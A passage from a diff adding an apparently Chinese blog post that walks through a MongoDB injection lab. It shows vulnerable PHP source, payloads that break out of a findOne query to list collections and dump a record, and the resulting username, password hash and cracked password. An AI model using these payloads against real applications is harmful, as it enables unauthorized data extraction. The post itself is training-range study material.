+<span class="token variable">$obj</span><span class="token operator">=</span><span class="token variable">$db</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!D0CTYPE</span> <span class="token attr-name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF- -8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>XWAYAKEV3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">. <span class="token function">body</span><span class="token punctuation">(</span><span class="token property">width</span><span class="token punctuation">:</span> 600px <span class="token punctuation">;</span> <span class="token property">height</span> <span class="token punctuation">:</span>500px <span class="token property">margin</span><span class="token punctuation">:</span>Ø auto<span class="token punctuation">)</span>. tit <span class="token property">lefcolor</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span>60px<span class="token punctuation">;</span> line - <span class="token property">height</span><span class="token punctuation">:</span>60px<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span>30px<span class="token punctuation">;</span> font- <span class="token property">weight</span> <span class="token punctuation">:</span> 700 <span class="token property">margin-top</span><span class="token punctuation">:</span> 75pt <span class="token punctuation">;</span> border <span class="token property">-bottom</span><span class="token punctuation">:</span>2px solid red<span class="token punctuation">;</span> text- <span class="token property">-align</span><span class="token punctuation">:</span> center].content<span class="token punctuation">,</span> . <span class="token property">titlefmargin</span><span class="token punctuation">:</span>Ø auto<span class="token punctuation">;</span> <span class="token property">width</span><span class="token punctuation">:</span> 600px <span class="token punctuation">;</span> <span class="token property">display</span><span class="token punctuation">:</span> b lock]. <span class="token property">contentfheight</span> <span class="token punctuation">:</span>30px<span class="token punctuation">;</span> <span class="token property">line-height</span><span class="token punctuation">:</span>30px<span class="token punctuation">;</span>font- <span class="token property">size</span><span class="token punctuation">:</span>18px<span class="token punctuation">;</span><span class="token property">margin-top</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span> <span class="token property">text-align</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span> <span class="token property">color</span><span class="token punctuation">:</span>#828282]</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+body
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>body<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'retval'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'retval'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
+
+<p>源码中未对输入的id进行过滤，并且数据库的名字为<code>mozhe_cms_Authority</code>，请求<code>http://219.153.49.228:44380/new_list.php?id=1</code>页面正常，请求</p>
+<p><code>http://219.153.49.228:44380/new_list.php?id=1&#39;</code>页面返回空，说明id存在注入点。</p>
+<h2 id="详解（重要）"><a href="#详解（重要）" class="headerlink" title="详解（重要）"></a>详解（重要）</h2><p>拼接前后都要闭合 把前面的<code>&#39;&#123;( </code>闭合之后不能不管后面的<code>&#39;)&#125;</code></p>
+<pre class="language-shell" data-language="shell"><code class="language-shell">#源码：
+$query&#x3D;&quot;var data&#x3D;db.notice.findOne(&#123;&#39;id&#39;:&#39;$id&#39;&#125;); return data;&quot;;
+#对应的语句中为：
+(&#123;&#39;id&#39;:&#39;$id        &#39;&#125;)
+#构造payload：
+id &#x3D;1&#39;&#125;);return(&#123;content:1,title:&#39;2
+#对应到语句中为：
+(&#123;&#39;id&#39;:&#39;1&#39;&#125;);return(&#123;content:1,title:&#39;2          &#39;&#125;)</code></pre>
+
+<p>此时页面回显已经改变</p>
+<p><img src="C:\Users\Yty\AppData\Roaming\Typora\typora-user-images\image-20211125184412148.png" alt="image-20211125184412148"></p>
+<pre class="language-shell" data-language="shell"><code class="language-shell"># 回显集合名：
+id&#x3D;1&#39;&#125;); return(&#123;content:tojson(db.getCollectionNames()),title:&#39;1   或者
+id&#x3D;1&#39;&#125;); return(&#123;content:db.getCollectionNames()[0],title:&#39;1        拿第一个
+#得到结果
+[ &quot;Authority_confidential&quot;, &quot;notice&quot;, &quot;system.indexes&quot; ]
+
+
+# 回显字段信息
+id&#x3D;1&#39;&#125;); return(&#123;content:tojson(db.Authority_confidential.find()[0]),title:&#39;1
+#得到结果
+&#123; &quot;_id&quot; : ObjectId(&quot;619f68a36af28db66dcfb2f7&quot;), &quot;name&quot; : &quot;mozhe&quot;, &quot;password&quot; : &quot;a83cd5ad5ed3e1c5597441aaab289f5c&quot;, &quot;status&quot; : &quot;0&quot; &#125;
+
+#密码md5 解密  dsansda</code></pre>
+
+
+
+
+
+
+
+<blockquote>
+<p>参考（复制）内容来自：</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1602092">从零学习 NoSQL 注入之 Mongodb - 云+社区 - 腾讯云 (tencent.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">MongoDB 注入指北 - Tr0y’s Blog</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/web/">
+                                    <span class="chip bg-color">web</span>
+                                </a>
+                            
+                                <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">sql注入</span>
+                                </a>
+                            
+                                <a href="/tags/nosql/">
+                                    <span class="chip bg-color">nosql</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2021/11/25/mongo%E6%B3%A8%E5%85%A5/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="mongo注入">
+                        
+                        <span class="card-title">mongo注入</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            mongo靶场实战及相关知识
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%94%BB%E9%98%B2-web/" class="post-category">
+                                    攻防-web
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">sql注入</span>
+                    </a>
+                    
+                    <a href="/tags/nosql/">
+                        <span class="chip bg-color">nosql</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/11/18/linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="linux提权方式收集">
+                        
+                        <span class="card-title">linux提权方式收集</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            linux提权方式收集
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-18
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%94%BB%E9%98%B2-linux/" class="post-category">
+                                    攻防-linux
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%8F%90%E6%9D%83/">
+                        <span class="chip bg-color">提权</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFunction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
